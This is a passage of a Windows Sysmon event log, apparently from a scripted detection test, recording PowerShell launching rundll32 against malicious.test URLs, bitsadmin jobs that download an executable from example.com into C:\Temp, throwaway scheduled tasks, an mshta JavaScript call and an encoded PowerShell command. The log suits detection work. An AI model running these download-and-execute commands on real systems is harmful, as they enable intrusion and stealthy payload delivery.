ParentProcessGuid: {3a35410f-92d8-6928-9213-000000000b00}
ParentProcessId: 14480
ParentImage: C:\Windows\System32\rundll32.exe
ParentCommandLine: ""C:\Windows\system32\rundll32.exe"" url.dll,FileProtocolHandler http://malicious.test/34 
ParentUser: DESKTOP-EJG8QJC\Emil Jinu"
"11/27/2025 11:35:14 PM","1","Information","Process Create:
RuleName: -
UtcTime: 2025-11-27 18:05:14.071
ProcessGuid: {3a35410f-92da-6928-9d13-000000000b00}
ProcessId: 3720
Image: C:\Windows\System32\bitsadmin.exe
FileVersion: 7.8.19041.1 (WinBuild.160101.0800)
Description: BITS administration utility
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: bitsadmin.exe
CommandLine: ""C:\Windows\system32\bitsadmin.exe"" /complete job34 
CurrentDirectory: C:\Windows\system32\
User: DESKTOP-EJG8QJC\Emil Jinu
LogonGuid: {3a35410f-6604-6928-9de6-200000000000}
LogonId: 0x20E69D
TerminalSessionId: 1
IntegrityLevel: High
Hashes: MD5=01AAB62D5799F75B0D69EB29C1CA6855,SHA256=739B2DD012EA183895CC01116906F339C9AA1C0BAABF6F22C8E59E25A0C12917,IMPHASH=774033454EB79213B09F788FC004A02D
ParentProcessGuid: {3a35410f-8dd3-6928-e507-000000000b00}
ParentProcessId: 4396
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" 
ParentUser: DESKTOP-EJG8QJC\Emil Jinu"
"11/27/2025 11:35:13 PM","1","Information","Process Create:
RuleName: -
UtcTime: 2025-11-27 18:05:13.946
ProcessGuid: {3a35410f-92d9-6928-9b13-000000000b00}
ProcessId: 13228
Image: C:\Windows\System32\bitsadmin.exe
FileVersion: 7.8.19041.1 (WinBuild.160101.0800)
Description: BITS administration utility
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: bitsadmin.exe
CommandLine: ""C:\Windows\system32\bitsadmin.exe"" /resume job34 
CurrentDirectory: C:\Windows\system32\
User: DESKTOP-EJG8QJC\Emil Jinu
LogonGuid: {3a35410f-6604-6928-9de6-200000000000}
LogonId: 0x20E69D
TerminalSessionId: 1
IntegrityLevel: High
Hashes: MD5=01AAB62D5799F75B0D69EB29C1CA6855,SHA256=739B2DD012EA183895CC01116906F339C9AA1C0BAABF6F22C8E59E25A0C12917,IMPHASH=774033454EB79213B09F788FC004A02D
ParentProcessGuid: {3a35410f-8dd3-6928-e507-000000000b00}
ParentProcessId: 4396
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" 
ParentUser: DESKTOP-EJG8QJC\Emil Jinu"
"11/27/2025 11:35:13 PM","1","Information","Process Create:
RuleName: -
UtcTime: 2025-11-27 18:05:13.211
ProcessGuid: {3a35410f-92d9-6928-9813-000000000b00}
ProcessId: 4168
Image: C:\Windows\System32\bitsadmin.exe
FileVersion: 7.8.19041.1 (WinBuild.160101.0800)
Description: BITS administration utility
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: bitsadmin.exe
CommandLine: ""C:\Windows\system32\bitsadmin.exe"" /addfile job34 http://example.com/file.exe C:\Temp\file34.exe 
CurrentDirectory: C:\Windows\system32\
User: DESKTOP-EJG8QJC\Emil Jinu
LogonGuid: {3a35410f-6604-6928-9de6-200000000000}
LogonId: 0x20E69D
TerminalSessionId: 1
IntegrityLevel: High
Hashes: MD5=01AAB62D5799F75B0D69EB29C1CA6855,SHA256=739B2DD012EA183895CC01116906F339C9AA1C0BAABF6F22C8E59E25A0C12917,IMPHASH=774033454EB79213B09F788FC004A02D
ParentProcessGuid: {3a35410f-8dd3-6928-e507-000000000b00}
ParentProcessId: 4396
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" 
ParentUser: DESKTOP-EJG8QJC\Emil Jinu"
"11/27/2025 11:35:13 PM","1","Information","Process Create:
RuleName: -
UtcTime: 2025-11-27 18:05:13.137
ProcessGuid: {3a35410f-92d9-6928-9613-000000000b00}
ProcessId: 9600
Image: C:\Windows\System32\bitsadmin.exe
FileVersion: 7.8.19041.1 (WinBuild.160101.0800)
Description: BITS administration utility
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: bitsadmin.exe
CommandLine: ""C:\Windows\system32\bitsadmin.exe"" /create job34 
CurrentDirectory: C:\Windows\system32\
User: DESKTOP-EJG8QJC\Emil Jinu
LogonGuid: {3a35410f-6604-6928-9de6-200000000000}
LogonId: 0x20E69D
TerminalSessionId: 1
IntegrityLevel: High
Hashes: MD5=01AAB62D5799F75B0D69EB29C1CA6855,SHA256=739B2DD012EA183895CC01116906F339C9AA1C0BAABF6F22C8E59E25A0C12917,IMPHASH=774033454EB79213B09F788FC004A02D
ParentProcessGuid: {3a35410f-8dd3-6928-e507-000000000b00}
ParentProcessId: 4396
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" 
ParentUser: DESKTOP-EJG8QJC\Emil Jinu"
"11/27/2025 11:35:13 PM","1","Information","Process Create:
RuleName: -
UtcTime: 2025-11-27 18:05:13.060
ProcessGuid: {3a35410f-92d9-6928-9413-000000000b00}
ProcessId: 15532
Image: C:\Windows\System32\schtasks.exe
FileVersion: 10.0.19041.5965 (WinBuild.160101.0800)
Description: Task Scheduler Configuration Tool
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: schtasks.exe
CommandLine: ""C:\Windows\system32\schtasks.exe"" /delete /tn FakeTask34 /f 
CurrentDirectory: C:\Windows\system32\
User: DESKTOP-EJG8QJC\Emil Jinu
LogonGuid: {3a35410f-6604-6928-9de6-200000000000}
LogonId: 0x20E69D
TerminalSessionId: 1
IntegrityLevel: High
Hashes: MD5=2C400322E4F96C1FEDB0F890C7668C92,SHA256=2327E073DCF25AE03DC851EA0F3414980D3168FA959F42C5F77BE1381AE6C41D,IMPHASH=7C296BC1AA0738F0783F000C5982A642
ParentProcessGuid: {3a35410f-8dd3-6928-e507-000000000b00}
ParentProcessId: 4396
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" 
ParentUser: DESKTOP-EJG8QJC\Emil Jinu"
"11/27/2025 11:35:13 PM","11","Information","File created:
RuleName: -
UtcTime: 2025-11-27 18:05:13.042
ProcessGuid: {3a35410f-92d8-6928-8e13-000000000b00}
ProcessId: 5616
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\Emil Jinu\AppData\Local\Temp\__PSScriptPolicyTest_radz4p04.uz2.ps1
CreationUtcTime: 2025-11-27 18:05:13.042
User: DESKTOP-EJG8QJC\Emil Jinu"
"11/27/2025 11:35:13 PM","1","Information","Process Create:
RuleName: -
UtcTime: 2025-11-27 18:05:13.008
ProcessGuid: {3a35410f-92d9-6928-9313-000000000b00}
ProcessId: 16356
Image: C:\Windows\System32\schtasks.exe
FileVersion: 10.0.19041.5965 (WinBuild.160101.0800)
Description: Task Scheduler Configuration Tool
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: schtasks.exe
CommandLine: ""C:\Windows\system32\schtasks.exe"" /create /tn FakeTask34 /tr notepad.exe /sc once /st 23:59 
CurrentDirectory: C:\Windows\system32\
User: DESKTOP-EJG8QJC\Emil Jinu
LogonGuid: {3a35410f-6604-6928-9de6-200000000000}
LogonId: 0x20E69D
TerminalSessionId: 1
IntegrityLevel: High
Hashes: MD5=2C400322E4F96C1FEDB0F890C7668C92,SHA256=2327E073DCF25AE03DC851EA0F3414980D3168FA959F42C5F77BE1381AE6C41D,IMPHASH=7C296BC1AA0738F0783F000C5982A642
ParentProcessGuid: {3a35410f-8dd3-6928-e507-000000000b00}
ParentProcessId: 4396
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" 
ParentUser: DESKTOP-EJG8QJC\Emil Jinu"
"11/27/2025 11:35:12 PM","1","Information","Process Create:
RuleName: -
UtcTime: 2025-11-27 18:05:12.921
ProcessGuid: {3a35410f-92d8-6928-9213-000000000b00}
ProcessId: 14480
Image: C:\Windows\System32\rundll32.exe
FileVersion: 10.0.19041.5794 (WinBuild.160101.0800)
Description: Windows host process (Rundll32)
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: RUNDLL32.EXE
CommandLine: ""C:\Windows\system32\rundll32.exe"" url.dll,FileProtocolHandler http://malicious.test/34 
CurrentDirectory: C:\Windows\system32\
User: DESKTOP-EJG8QJC\Emil Jinu
LogonGuid: {3a35410f-6604-6928-9de6-200000000000}
LogonId: 0x20E69D
TerminalSessionId: 1
IntegrityLevel: High
Hashes: MD5=5A43032AEBD51583832EF3E96F5C81DA,SHA256=076592CA1957F8F357CC201F0015072C612F5770AD7DE85F87F254253C754DD7,IMPHASH=F207A867D6098266EE63A3CA677EB0FF
ParentProcessGuid: {3a35410f-8dd3-6928-e507-000000000b00}
ParentProcessId: 4396
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" 
ParentUser: DESKTOP-EJG8QJC\Emil Jinu"
"11/27/2025 11:35:12 PM","8","Information","CreateRemoteThread detected:
RuleName: -
UtcTime: 2025-11-27 18:05:12.758
SourceProcessGuid: {3a35410f-8dd3-6928-e507-000000000b00}
SourceProcessId: 4396
SourceImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetProcessGuid: {3a35410f-92d8-6928-9113-000000000b00}
TargetProcessId: 11236
TargetImage: <unknown process>
NewThreadId: 8804
StartAddress: 0x00007FF6970C30D0
StartModule: -
StartFunction: -
SourceUser: DESKTOP-EJG8QJC\Emil Jinu
TargetUser: DESKTOP-EJG8QJC\Emil Jinu"
"11/27/2025 11:35:12 PM","1","Information","Process Create:
RuleName: -
UtcTime: 2025-11-27 18:05:12.691
ProcessGuid: {3a35410f-92d8-6928-9013-000000000b00}
ProcessId: 10212
Image: C:\Windows\System32\mshta.exe
FileVersion: 11.00.19041.5794 (WinBuild.160101.0800)
Description: Microsoft (R) HTML Application host
Product: Internet Explorer
Company: Microsoft Corporation
OriginalFileName: MSHTA.EXE
CommandLine: ""C:\Windows\system32\mshta.exe"" javascript:alert('test34') 
CurrentDirectory: C:\Windows\system32\
User: DESKTOP-EJG8QJC\Emil Jinu
LogonGuid: {3a35410f-6604-6928-9de6-200000000000}
LogonId: 0x20E69D
TerminalSessionId: 1
IntegrityLevel: High
Hashes: MD5=B8ED3F707000C22AEE6BBF961879EA99,SHA256=F8A2FD36FDC35AA8E7E678576A2ECC5D7B3FE6383E73101508E5D7B49443D153,IMPHASH=482D661ACB78B36340AF7BEB797951EE
ParentProcessGuid: {3a35410f-8dd3-6928-e507-000000000b00}
ParentProcessId: 4396
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" 
ParentUser: DESKTOP-EJG8QJC\Emil Jinu"
"11/27/2025 11:35:12 PM","11","Information","File created:
RuleName: T1053
UtcTime: 2025-11-27 18:05:12.301
ProcessGuid: {3a35410f-6568-6928-2400-000000000b00}
ProcessId: 1532
Image: C:\Windows\system32\svchost.exe
TargetFilename: C:\Windows\System32\Tasks\FakeTask33
CreationUtcTime: 2025-11-27 18:05:12.301
User: NT AUTHORITY\SYSTEM"
"11/27/2025 11:35:12 PM","1","Information","Process Create:
RuleName: -
UtcTime: 2025-11-27 18:05:12.220
ProcessGuid: {3a35410f-92d8-6928-8e13-000000000b00}
ProcessId: 5616
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
FileVersion: 10.0.19041.3996 (WinBuild.160101.0800)
Description: Windows PowerShell
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: PowerShell.EXE
CommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" -EncodedCommand VwByAGkAdABlAC0ATwB1AHQAcAB1AHQAIAAnAHMAdQBzAHAAaQBjAGkAbwB1AHMAXwBlAHYAZQBuAHQAXwAzADMAJwA= 
CurrentDirectory: C:\Windows\system32\
User: DESKTOP-EJG8QJC\Emil Jinu
LogonGuid: {3a35410f-6604-6928-9de6-200000000000}
LogonId: 0x20E69D
TerminalSessionId: 1
IntegrityLevel: High
Hashes: MD5=2E5A8590CF6848968FC23DE3FA1E25F1,SHA256=9785001B0DCF755EDDB8AF294A373C0B87B2498660F724E76C4D53F9C217C7A3,IMPHASH=3D08F4848535206D772DE145804FF4B6
ParentProcessGuid: {3a35410f-8dd3-6928-e507-000000000b00}
ParentProcessId: 4396
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" 
ParentUser: DESKTOP-EJG8QJC\Emil Jinu"
"11/27/2025 11:35:12 PM","1","Information","Process Create:
RuleName: -
UtcTime: 2025-11-27 18:05:12.201
ProcessGuid: {3a35410f-92d8-6928-8d13-000000000b00}
ProcessId: 8952
Image: C:\Program Files\BraveSoftware\Brave-Browser\Application\brave.exe
FileVersion: 142.1.84.141
Description: Brave Browser
Product: Brave Browser
Company: Brave Software, Inc.
OriginalFileName: brave.exe
CommandLine: ""C:\Program Files\BraveSoftware\Brave-Browser\Application\brave.exe"" --type=crashpad-handler ""--user-data-dir=C:\Users\Emil Jinu\AppData\Local\BraveSoftware\Brave-Browser\User Data"" /prefetch:4 --monitor-self-annotation=ptype=crashpad-handler ""--database=C:\Users\Emil Jinu\AppData\Local\BraveSoftware\Brave-Browser\User Data\Crashpad"" ""--metrics-dir=C:\Users\Emil Jinu\AppData\Local\BraveSoftware\Brave-Browser\User Data"" --url=https://cr.brave.com --annotation=plat=Win64 --annotation=prod=Brave --annotation=ver=142.1.84.141 --initial-client-data=0x120,0x124,0x128,0xfc,0x12c,0x7ffd9b025a28,0x7ffd9b025a34,0x7ffd9b025a40
CurrentDirectory: C:\Program Files\BraveSoftware\Brave-Browser\Application\
User: DESKTOP-EJG8QJC\Emil Jinu
LogonGuid: {3a35410f-6604-6928-9de6-200000000000}
LogonId: 0x20E69D
TerminalSessionId: 1
IntegrityLevel: High
Hashes: MD5=D4E095946579C449803E47CFA028475E,SHA256=234A39FA17CC44BD8F5610B61997B7C69B289BC664A4D6B0AD8141ECC6685D2D,IMPHASH=3E82AE93B8102462DDA81604AF164E8E
ParentProcessGuid: {3a35410f-92d7-6928-8c13-000000000b00}
ParentProcessId: 15864
ParentImage: C:\Program Files\BraveSoftware\Brave-Browser\Application\brave.exe
ParentCommandLine: ""C:\Program Files\BraveSoftware\Brave-Browser\Application\brave.exe"" --single-argument http://malicious.test/33
ParentUser: DESKTOP-EJG8QJC\Emil Jinu"
"11/27/2025 11:35:11 PM","1","Information","Process Create:
RuleName: -
UtcTime: 2025-11-27 18:05:11.896
ProcessGuid: {3a35410f-92d7-6928-8c13-000000000b00}
ProcessId: 15864
Image: C:\Program Files\BraveSoftware\Brave-Browser\Application\brave.exe
FileVersion: 142.1.84.141
Description: Brave Browser
Product: Brave Browser
Company: Brave Software, Inc.
OriginalFileName: brave.exe
CommandLine: ""C:\Program Files\BraveSoftware\Brave-Browser\Application\brave.exe"" --single-argument http://malicious.test/33
CurrentDirectory: C:\Windows\system32\
User: DESKTOP-EJG8QJC\Emil Jinu
LogonGuid: {3a35410f-6604-6928-9de6-200000000000}
LogonId: 0x20E69D
TerminalSessionId: 1
IntegrityLevel: High
Hashes: MD5=D4E095946579C449803E47CFA028475E,SHA256=234A39FA17CC44BD8F5610B61997B7C69B289BC664A4D6B0AD8141ECC6685D2D,IMPHASH=3E82AE93B8102462DDA81604AF164E8E
ParentProcessGuid: {3a35410f-92d7-6928-7d13-000000000b00}
ParentProcessId: 14956
ParentImage: C:\Windows\System32\rundll32.exe
ParentCommandLine: ""C:\Windows\system32\rundll32.exe"" url.dll,FileProtocolHandler http://malicious.test/33 
ParentUser: DESKTOP-EJG8QJC\Emil Jinu"
"11/27/2025 11:35:11 PM","1","Information","Process Create:
RuleName: -
UtcTime: 2025-11-27 18:05:11.835
ProcessGuid: {3a35410f-92d7-6928-8a13-000000000b00}
ProcessId: 15808
Image: C:\Windows\System32\wbem\WMIC.exe
FileVersion: 10.0.19041.5794 (WinBuild.160101.0800)
Description: WMI Commandline Utility
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: wmic.exe
CommandLine: ""C:\Windows\System32\Wbem\WMIC.exe"" os get Caption 
CurrentDirectory: C:\Windows\system32\
User: DESKTOP-EJG8QJC\Emil Jinu
LogonGuid: {3a35410f-6604-6928-9de6-200000000000}
LogonId: 0x20E69D
TerminalSessionId: 1
IntegrityLevel: High
Hashes: MD5=EBE8CE528A79B5CC0782E8DFDA250600,SHA256=DA603FA720AB43AA6D4D36AA9FDB828DAB9645523EABAAC209AF6451D5B4D757,IMPHASH=527C7C66CDD13D72D793BCA3A417BCBE
ParentProcessGuid: {3a35410f-8dd3-6928-e507-000000000b00}
ParentProcessId: 4396
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" 
ParentUser: DESKTOP-EJG8QJC\Emil Jinu"
"11/27/2025 11:35:11 PM","1","Information","Process Create:
RuleName: -
UtcTime: 2025-11-27 18:05:11.419
ProcessGuid: {3a35410f-92d7-6928-8813-000000000b00}
ProcessId: 15916
Image: C:\Windows\System32\bitsadmin.exe
FileVersion: 7.8.19041.1 (WinBuild.160101.0800)
Description: BITS administration utility
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: bitsadmin.exe
CommandLine: ""C:\Windows\system32\bitsadmin.exe"" /complete job33 
CurrentDirectory: C:\Windows\system32\
User: DESKTOP-EJG8QJC\Emil Jinu
LogonGuid: {3a35410f-6604-6928-9de6-200000000000}
LogonId: 0x20E69D
TerminalSessionId: 1
IntegrityLevel: High
Hashes: MD5=01AAB62D5799F75B0D69EB29C1CA6855,SHA256=739B2DD012EA183895CC01116906F339C9AA1C0BAABF6F22C8E59E25A0C12917,IMPHASH=774033454EB79213B09F788FC004A02D
ParentProcessGuid: {3a35410f-8dd3-6928-e507-000000000b00}
ParentProcessId: 4396
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" 
ParentUser: DESKTOP-EJG8QJC\Emil Jinu"
"11/27/2025 11:35:11 PM","1","Information","Process Create:
RuleName: -
UtcTime: 2025-11-27 18:05:11.361
ProcessGuid: {3a35410f-92d7-6928-8613-000000000b00}
ProcessId: 6676
Image: C:\Windows\System32\bitsadmin.exe
FileVersion: 7.8.19041.1 (WinBuild.160101.0800)
Description: BITS administration utility
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: bitsadmin.exe
CommandLine: ""C:\Windows\system32\bitsadmin.exe"" /resume job33 
CurrentDirectory: C:\Windows\system32\
User: DESKTOP-EJG8QJC\Emil Jinu
LogonGuid: {3a35410f-6604-6928-9de6-200000000000}
LogonId: 0x20E69D
TerminalSessionId: 1
IntegrityLevel: High
Hashes: MD5=01AAB62D5799F75B0D69EB29C1CA6855,SHA256=739B2DD012EA183895CC01116906F339C9AA1C0BAABF6F22C8E59E25A0C12917,IMPHASH=774033454EB79213B09F788FC004A02D
ParentProcessGuid: {3a35410f-8dd3-6928-e507-000000000b00}
ParentProcessId: 4396
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" 
ParentUser: DESKTOP-EJG8QJC\Emil Jinu"
"11/27/2025 11:35:11 PM","1","Information","Process Create:
RuleName: -
UtcTime: 2025-11-27 18:05:11.309
ProcessGuid: {3a35410f-92d7-6928-8313-000000000b00}
ProcessId: 5904
Image: C:\Windows\System32\bitsadmin.exe
FileVersion: 7.8.19041.1 (WinBuild.160101.0800)
Description: BITS administration utility
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: bitsadmin.exe
CommandLine: ""C:\Windows\system32\bitsadmin.exe"" /addfile job33 http://example.com/file.exe C:\Temp\file33.exe 
CurrentDirectory: C:\Windows\system32\
User: DESKTOP-EJG8QJC\Emil Jinu
LogonGuid: {3a35410f-6604-6928-9de6-200000000000}
LogonId: 0x20E69D
TerminalSessionId: 1
IntegrityLevel: High
Hashes: MD5=01AAB62D5799F75B0D69EB29C1CA6855,SHA256=739B2DD012EA183895CC01116906F339C9AA1C0BAABF6F22C8E59E25A0C12917,IMPHASH=774033454EB79213B09F788FC004A02D
ParentProcessGuid: {3a35410f-8dd3-6928-e507-000000000b00}
ParentProcessId: 4396
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" 
ParentUser: DESKTOP-EJG8QJC\Emil Jinu"
"11/27/2025 11:35:11 PM","1","Information","Process Create:
RuleName: -
UtcTime: 2025-11-27 18:05:11.253
ProcessGuid: {3a35410f-92d7-6928-8013-000000000b00}
ProcessId: 1100
Image: C:\Windows\System32\bitsadmin.exe
FileVersion: 7.8.19041.1 (WinBuild.160101.0800)
Description: BITS administration utility
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: bitsadmin.exe
CommandLine: ""C:\Windows\system32\bitsadmin.exe"" /create job33 
CurrentDirectory: C:\Windows\system32\
User: DESKTOP-EJG8QJC\Emil Jinu
LogonGuid: {3a35410f-6604-6928-9de6-200000000000}
LogonId: 0x20E69D
TerminalSessionId: 1
IntegrityLevel: High
Hashes: MD5=01AAB62D5799F75B0D69EB29C1CA6855,SHA256=739B2DD012EA183895CC01116906F339C9AA1C0BAABF6F22C8E59E25A0C12917,IMPHASH=774033454EB79213B09F788FC004A02D
ParentProcessGuid: {3a35410f-8dd3-6928-e507-000000000b00}
ParentProcessId: 4396
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" 
ParentUser: DESKTOP-EJG8QJC\Emil Jinu"
"11/27/2025 11:35:11 PM","1","Information","Process Create:
RuleName: -
UtcTime: 2025-11-27 18:05:11.225
ProcessGuid: {3a35410f-92d7-6928-7f13-000000000b00}
ProcessId: 13228
Image: C:\Windows\System32\schtasks.exe
FileVersion: 10.0.19041.5965 (WinBuild.160101.0800)
Description: Task Scheduler Configuration Tool
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: schtasks.exe
CommandLine: ""C:\Windows\system32\schtasks.exe"" /delete /tn FakeTask33 /f 
CurrentDirectory: C:\Windows\system32\
User: DESKTOP-EJG8QJC\Emil Jinu
LogonGuid: {3a35410f-6604-6928-9de6-200000000000}
LogonId: 0x20E69D
TerminalSessionId: 1
IntegrityLevel: High
Hashes: MD5=2C400322E4F96C1FEDB0F890C7668C92,SHA256=2327E073DCF25AE03DC851EA0F3414980D3168FA959F42C5F77BE1381AE6C41D,IMPHASH=7C296BC1AA0738F0783F000C5982A642
ParentProcessGuid: {3a35410f-8dd3-6928-e507-000000000b00}
ParentProcessId: 4396
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" 
ParentUser: DESKTOP-EJG8QJC\Emil Jinu"
"11/27/2025 11:35:11 PM","1","Information","Process Create:
RuleName: -
UtcTime: 2025-11-27 18:05:11.152
ProcessGuid: {3a35410f-92d7-6928-7e13-000000000b00}
ProcessId: 3048
Image: C:\Windows\System32\schtasks.exe
FileVersion: 10.0.19041.5965 (WinBuild.160101.0800)
Description: Task Scheduler Configuration Tool
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: schtasks.exe
CommandLine: ""C:\Windows\system32\schtasks.exe"" /create /tn FakeTask33 /tr notepad.exe /sc once /st 23:59 
CurrentDirectory: C:\Windows\system32\
User: DESKTOP-EJG8QJC\Emil Jinu
LogonGuid: {3a35410f-6604-6928-9de6-200000000000}
LogonId: 0x20E69D
TerminalSessionId: 1
IntegrityLevel: High
Hashes: MD5=2C400322E4F96C1FEDB0F890C7668C92,SHA256=2327E073DCF25AE03DC851EA0F3414980D3168FA959F42C5F77BE1381AE6C41D,IMPHASH=7C296BC1AA0738F0783F000C5982A642
ParentProcessGuid: {3a35410f-8dd3-6928-e507-000000000b00}
ParentProcessId: 4396
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" 
ParentUser: DESKTOP-EJG8QJC\Emil Jinu"
"11/27/2025 11:35:11 PM","1","Information","Process Create:
RuleName: -
UtcTime: 2025-11-27 18:05:11.113
ProcessGuid: {3a35410f-92d7-6928-7d13-000000000b00}
ProcessId: 14956
Image: C:\Windows\System32\rundll32.exe
FileVersion: 10.0.19041.5794 (WinBuild.160101.0800)
Description: Windows host process (Rundll32)
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: RUNDLL32.EXE
CommandLine: ""C:\Windows\system32\rundll32.exe"" url.dll,FileProtocolHandler http://malicious.test/33 
CurrentDirectory: C:\Windows\system32\
User: DESKTOP-EJG8QJC\Emil Jinu
LogonGuid: {3a35410f-6604-6928-9de6-200000000000}
LogonId: 0x20E69D
TerminalSessionId: 1
IntegrityLevel: High
Hashes: MD5=5A43032AEBD51583832EF3E96F5C81DA,SHA256=076592CA1957F8F357CC201F0015072C612F5770AD7DE85F87F254253C754DD7,IMPHASH=F207A867D6098266EE63A3CA677EB0FF
ParentProcessGuid: {3a35410f-8dd3-6928-e507-000000000b00}
ParentProcessId: 4396
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" 
ParentUser: DESKTOP-EJG8QJC\Emil Jinu"
"11/27/2025 11:35:10 PM","11","Information","File created:
RuleName: -
UtcTime: 2025-11-27 18:05:10.565
ProcessGuid: {3a35410f-92d5-6928-7513-000000000b00}
ProcessId: 16124
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\Emil Jinu\AppData\Local\Temp\__PSScriptPolicyTest_vkv4qufm.qha.ps1
CreationUtcTime: 2025-11-27 18:05:10.565
User: DESKTOP-EJG8QJC\Emil Jinu"
